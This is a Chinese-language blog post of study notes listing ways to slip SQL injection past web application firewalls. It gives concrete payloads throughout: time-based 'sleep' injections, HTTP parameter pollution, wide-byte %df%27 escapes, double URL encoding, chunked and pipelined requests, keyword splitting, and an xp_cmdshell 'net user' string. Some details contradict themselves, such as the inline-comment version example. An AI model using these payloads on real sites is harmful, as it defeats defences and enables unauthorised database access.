---
title: "[WAF绕过]SQL注入篇"
desc: TonyD0g
date: 2022-01-06 16:14:53
tags: WAF绕过
---
<font size=4 >

###### [版本0x1] 
###### 2022-01-05

## 1.SQL绕WAF的各种方式:

1. **空格过滤绕过**
5. **内联注释绕过**
6. **请求方式差异规则松懈绕过**
7. **异常/多种Method方法绕过**
8. **超大数据包绕过**
9. **参数污染HPP**
10. **添加%绕过过滤**
11. **协议未覆盖绕过**
12. **宽字节绕过**
14. **Cookie/X-Forwarded-For注入绕过**
15. **利用pipline进行绕过**
16. **利用分块编码传输绕过**
17. **冷门函数/字符/运算符绕过**
1. **各种编码绕过**
2. **关键字匹配绕过**
2. 字母大小写转换
4. 双关键字绕过
13. %00截断
<br></br>

1.**空格过滤绕过**:
```
a.使用空白符替换空格绕过:
SQLite3           0A，0D，0C，09，20            
MySQL5            09，0A，0B，0C，0D，A0，20            
PosgresSQL        0A，0D，0C，09，20            
Oracle 11g        00，0A，0D，0C，09，20            
MSSQL             01，02，03，04，05，06，07，08，09，0A，0B，0C，0D，
                  0E，0F，10，11，12，13，14，15，16，17，18，19，1A，
                  1B，1C，1D，1E，1F，20                

b.使用加号 '+' 替换空格绕过
  使用减号 '-' 替换空格绕过
  使用点号 '.' 替换空格绕过

c.使用注释符/**/替换空格绕过

d.使用圆括号绕过: 
例如:
select(username)from(user)where(username)=('user1')

e.使用尖括号绕过:
例如:
id=-1 select{x user}from{x mysql.user}

id=-1 union select 1,{x 2},3

f.反引号'`'绕过,可以替代空格(反引号'`'是为了区分MySQL的保留字和普通字而引入的)
```
2.**内联注释绕过**:
```
内联注释:   /*!*/

例如:
当前mysql数据库的版本是5.1.73时

当内联注释中的版本设置为50173时，与当前mysql数据库版本相同，会正常执行内联注释中的sql语句.
/*!50173sleep(3)*/, 此注释里的语句将被执行.

当内联注释中的版本设置为50170时，小于当前mysql数据库版本50173,会正常执行内联注释中的sql语句.
/*!50170sleep(3)*/, 此注释里的语句将被执行.

但是当内联注释中的版本小于当前mysql数据库版本时，会报错
/*!50183sleep(3)*/, 此注释里的语句将被执行.
```
3.**请求方式差异规则松懈性绕过**:
```
有些WAF同时接收GET方法和POST的方法，但只在GET方法中增加了过滤规则，可通过发送POST方法进行绕过
```
4.**异常/多种Method绕过**:
```
有些WAF只检测GET，POST方法，可通过使用异常方法进行绕过.

比如:   
正常payload:   GET /xxx/?id=1+and+sleep(3) HTTP/1.1
绕过payload:   TonyD0g /xxx/?id=1+and+sleep(3)HTTP/1.1
               PUT /xxx/?id=1+and+sleep(3)HTTP/1.1
```
5.**超大数据包绕过**:
```
部分WAF只检测固定大小的内容，可通过添加无用字符进行绕过检测.
(也可能因为性能的原因)
添加无用字符，使内容大小超过WAF检测能检测到的最大内容.

比如:   
正常payload:   ?id=1+and+sleep(3) 

绕过payload:   ?id=1+and+sleep(3)+and+111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
               111111=11111111111111111111111111  
```
6.**参数污染HPP**:
```
在提交的URL中给一个参数多次赋了不同的值(?id=1&id=2)，部分WAF在处理的过程中可能只处理前面提交的参数值(id=1)，
而后端程序在处理的时候可能取的是最后面的值。

**(将攻击语句赋予最后一个id参数，可绕过WAF检测直接进入后端服务器)**

比如:
正常payload:    ?id=1+and+sleep(3) 

绕过payload:    ?id=1&id=2+and+sleep(3) 

不同的平台	                解析结果	                例如(其中Par1 ==> parameter1 , val1 ==> value1)
-----------------------------------------------------------------------------
ASP.NET/IIS	            所有出现的指定参数	            Par1=val1,val2
ASP/IIS	                    所有出现的指定参数	            Par1=val1,val2
AXIS 2400	            所有出现的指定参数	            Par1=val1,val2
DBMan	                    所有出现的指定参数	            Par1=val1~~val2
Jsp,Servlet/Apache Tomcat	第一个参数	            Par1=val1
Jsp,Servlet/Jetty	        第一个参数	            Par1=val1
IBM HTTP Server	                第一个参数	            Par1=val1
Perl CGI/Apache	                第一个参数	            Par1=val1
mod_wsgi(Python)/Apache	        第一个参数	            Par1=val1
mod_perl,libapreq2/Apache	第一个参数	            Par1=val1
PHP/Apache	                最后一个参数	            Par1=val2
PHP/Zeus	                最后一个参数	            Par1=val2
Ricoh Aficio 1022 Printer	第一个参数	            Par1=val1
webcamXP PRO	                第一个参数	            Par1=val1
Jsp,Servlet/Oracle AS 10G	第一个参数	            Par1=val1
IBM Lotus Domino	        最后一个参数	            Par1=val2
IceWarp	                        最后一个参数	            Par1=val2
Linksys Wireless-G PTZ	        最后一个参数	            Par1=val2
mod_perl,lib???/Apache	        变成一个数组	            ARRAY(0x8b9059c)
Python/Zope	                变成一个数组	            [‘val1’,‘val2’]
-----------------------------------------------------------------------------
```
7.**添加%绕过过滤**:
```
将WAF中过滤的敏感字符通过添加%绕过过滤.
比如:
关键字 se%lect
```
8.**协议未覆盖绕过**:
```
部分WAF可能只对一种content-type类型增加了检测规则，可以尝试互相替换尝试去绕过WAF过滤机制.

以下四种常见的content-type类型:

Content-Type:multipart/form-data;
Content-Type:application/x-www-form-urlencoded
Content-Type: text/xml
Content-Type: application/json
```
9.**宽字节绕过**:
```
宽字节注入是因为使用了GBK编码。
为了防止sql注入，提交的单引号(%27)会进行转义处理，即在单引号前加上斜杠(%5C%27)

比如:
正常payload:    ?id=1'and 1=1--+ 

绕过payload:    ?id=1%df%27and 1=1--+

问题在于 %df%27 经过转义后会变成 %df%5C%27 ,其中 %df%5c 会被识别为一个新的字节，而 %27 则被当做单引号，成功实现了语句闭合。
```
10.Cookie/X-Forwarded-For注入绕过:
```
部分WAF可能只对GET，POST提交的参数进行过滤，未对Cookie或者X-Forwarded-For进行检测，可尝试通过cookie或者X-Forwarded-For提交注入参数语句进行绕过.
```
11.**利用pipline绕过**:
```
当请求中的Connection字段值为keep-alive，则代表本次发起的请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止。部分WAF可能只对第一次传输过来的请求进行过滤处理.

首先关闭burp的Repeater的Content-Length自动更新.
修改Connection字段值为keep-alive，将带有攻击语句的数据请求附加到正常请求后面再发送一遍.
```
12.**利用分块编码传输绕过**:
```
分块传输编码是HTTP的一种数据传输机制，允许将消息体分成若干块进行发送。当数据请求包中header信息存在Transfer-Encoding: chunked，就代表这个消息体采用了分块编码传输

即 HTML请求体中的数据可以换行写.
比如:   
?id=
1+
and
+
sleep(3)
``` 
13.**冷门函数/字符/运算符绕过**:
```
floor() ==>  updatexml()，extractvalue() , xmlelement() 

GeometryCollection() , polygon() , linestring() , multipoint() , multilinestring() , multipolygon()

Substring() ==>  Mid() ，Substr() ，substring() , Lpad() ，Rpad() ，Left()

concat() ==>  concat_ws() ，group_concat()

ascii() ==> hex(),bin()

Sleep()  ==> benchmark()

limit 0,1  ==>  limit 1 offset 0

and  ==> && 

or ==> ||

'='  ==>  '<','>',like,in

@符号，select@^1.from users; @用于变量定义如@var_name，一个@表示用户定义，@@表示系统变量.
比如:
version() ==> @@version

datadir() ==> @@datadir

user() ==> @@user

```
14.**各种编码绕过**:
```
URL编码,Unicode编码，Base64编码，Hex编码，ASCII编码,各种进制等

** 一/二/多 次编码绕过 **

** 其中sql server数据库的 char函数 可以将字符转换为ASCII码，从而达到绕过 gpc 的效果 **
```
- URL编码
```
在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28、右括号%29

普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，

可以用两次编码绕过：page.php?id=1%252f%252a*/UNION%252f%252a /SELECT
```
- Unicode编码
```
Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了

看一下常用的几个符号的一些Unicode编码：

单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、 %c0%a7、%e0%80%a7

空格:   %u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0

左括号: %u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8

右括号: %u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9

举例:   
?id=10%D6‘%20AND%201=2%23

SELECT 'Ä'='A'; #1

两个示例中，前者利用双字节绕过，比如对单引号转义操作变成'，那么就变成了 %D6%5C'
%D6%5C 构成了一个款字节即Unicode字节，单引号可以正常使用

第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，
关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过

另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过，有兴趣的朋友可以去了解下

常见的编码当然还有二进制、八进制，它们不一定都派得上用场，但后面会提到使用二进制的例子
```
- 进制转换
```
举例：z.com/index.php?page_id=-15 /!u%6eion/ /!se%6cect/ 1,2,3,4…

SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))

示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码，使用上来说较少见一点
```
15.**关键字匹配绕过**:
```
例如:
select  ==> 'se'+'lec'+'t'

select  ==> %S%E%L%C%T 1,2,3

union select ==> (UnI)(oN)+(SeL)(EcT)

union select database() ==> union..select+database() ==> 'un'+'ion..se'+'le'+'ct'+'+dat"abase()"' 

1.aspx?id=1;EXEC(‘ma’+'ster..x’+'p_cm’+'dsh’+'ell ”net user”’)

id=-1 select{x user}from{x mysql.user}
```
16.字母大小写转换绕过:
```
极少WAF只过滤全大写(SLEEP)或者全小写(sleep)的敏感字符，未对sleeP/slEEp进行过滤，可对关键字进行大小写转换进行绕过.
(这条作用不大)
```
17.双关键字绕过:
```
WAF可能会对关键字只进行一次过滤处理，可使用双关键字绕过.
比如:sleSLEEPep
(这条作用不大)
```
18.%00截断:
```
部分WAF在解析参数的时候当遇到%00时，就会认为参数读取已结束，这样就会只对部分内容进行了过滤检测。
```
## 总结:
```
实际中的WAF检测规则错综复杂，需要我们通过手工或fuzzing，
并结合多种方法的组合拳去测试WAF检测原理，从而对抗WAF.
```
## 学习来源:
```
WAF的定义,工作原理,分类,部署方式:
https://www.freebuf.com/articles/web/229982.html

WAF的绕过:
https://www.yuque.com/weiker/xiaodi/qi668h

深入理解SQL注入绕过WAF和过滤机制:
https://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html

SQL注入Wiki:
http://sqlwiki.radare.cn/#/

```

</font>